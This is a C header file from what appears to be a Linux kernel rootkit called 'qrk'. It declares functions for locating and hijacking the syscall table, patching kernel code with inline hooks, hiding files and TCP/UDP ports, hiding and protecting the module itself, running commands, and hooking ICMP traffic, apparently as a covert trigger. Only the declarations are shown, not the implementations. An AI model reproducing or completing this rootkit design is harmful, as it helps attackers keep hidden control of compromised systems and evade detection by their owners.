#ifndef _QRK_COMMON_H_
#define _QRK_COMMON_H_

#include <linux/init.h>
#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/kobject.h>
#include <linux/string.h>
#include <linux/slab.h>
#include <linux/version.h>
#include <linux/proc_fs.h>
#include <asm/cacheflush.h>
#include <linux/syscalls.h>
#include <linux/unistd.h>
#include <linux/kprobes.h>
#include <linux/kallsyms.h>
#include <asm/unistd.h>
#include <linux/sched.h>
#include <linux/mutex.h>
#include <linux/types.h>
#include <linux/delay.h>
#include <linux/sysfs.h>
#include <linux/list.h>
#include <linux/fs.h>
#include <linux/cred.h>
#include <linux/rbtree.h>
#include <linux/uaccess.h>
#include <linux/limits.h>
#include <linux/skbuff.h>
#include <linux/in.h>
#include <linux/icmp.h>
#include <linux/ip.h>
#include <linux/netfilter.h>
#include <linux/netfilter_ipv4.h>
#include <net/tcp.h>
#include <net/udp.h>

/* dbg output */
#ifdef KDEBUG
#define dbg(fmt, ...)               \
    do                              \
    {                               \
        printk(fmt, ##__VA_ARGS__); \
    } while (0)
#else
#define dbg(fmt, ...)
#endif


#ifdef FSDEBUG
#define fs_dbg(fmt, ...)               \
    do                              \
    {                               \
        printk(fmt, ##__VA_ARGS__); \
    } while (0)
#else
#define fs_dbg(fmt, ...)
#endif

/* qrk_common */
void *memmem(const void *haystack, size_t haystack_size, const void *needle, size_t needle_size);
void *memstr ( const void *haystack, const char *needle, size_t size );

/* qrk_entry */
int rk_init(void);
void rk_exit(void);

/* qrk_hook: just a engine */
#define ptr_t unsigned long

void dbg_pt_regs(const struct pt_regs *regs);
unsigned long get_param_from_regs(const struct pt_regs *regs, int n);
char* str_remove_duplicates(char *str) ;

int hook_init(void);
void hook_exit(void);

extern void **syscall_table;
ptr_t find_syscall_table(void);
ptr_t get_symbol(char *sym_name);

struct hijack_internal
{
    struct list_head list;
    int syscall_number;
    void *origin_fn;
    void *new_fn;
};
    /* operation */
void syscall_table_hijack_start(int syscall_number, void *newfn);
void syscall_table_hijack_stop(int syscall_number);
void syscall_table_hijack_resume(void);
void syscall_table_hijack_pause(void);
struct hijack_internal* syscall_table_hijack_get0(int syscall_number);

void inc_critical(struct mutex *lock, int *counter);
void dec_critical(struct mutex *lock, int *counter);

#define HIJACK_SIZE 12
struct sym_hook {
    void *old_fn;
    void *new_fn; 
    unsigned char o_code[HIJACK_SIZE]; // origin asm code 
    unsigned char n_code[HIJACK_SIZE]; // new asm code
    struct list_head list;
};
    /* asm operation */
void asm_hijack_start(void *old, void *newfn);
void asm_hijack_stop(void *newfn);
void asm_hijack_resume(void *newfn);
void* asm_hijack_pause(void *newfn); // ret: old_fn
void* asm_hijack_getaddr(void *newfn);

/* qrk_do_hook */
int do_hook_init(void);
void do_hook_exit(void);
void do_exec_cmd(char *cmd);

/* qrk_do_fs_hook */
int fs_hook_init(void);
void fs_hook_exit(void);
void fs_hide_file(char *path);
void fs_unhide_file(char *path);

/* qrk_self_protect */
void qrk_hide(void);
void qrk_unhide(void);
void qrk_protect(void);
void qrk_unprotect(void);

void self_protect_on(void);
void self_protect_off(void);

    /* TODO: Junk Code */

/* qrk_do_net_hook */
void icmp_init(void);
void icmp_exit(void);

void hide_tcp4_port(unsigned short port);
void unhide_tcp4_port(unsigned short port);
void hide_tcp6_port(unsigned short port);
void unhide_tcp6_port(unsigned short port);
void hide_udp4_port(unsigned short port);
void unhide_udp4_port(unsigned short port);
void hide_udp6_port(unsigned short port);
void unhide_udp6_port(unsigned short port);

#endif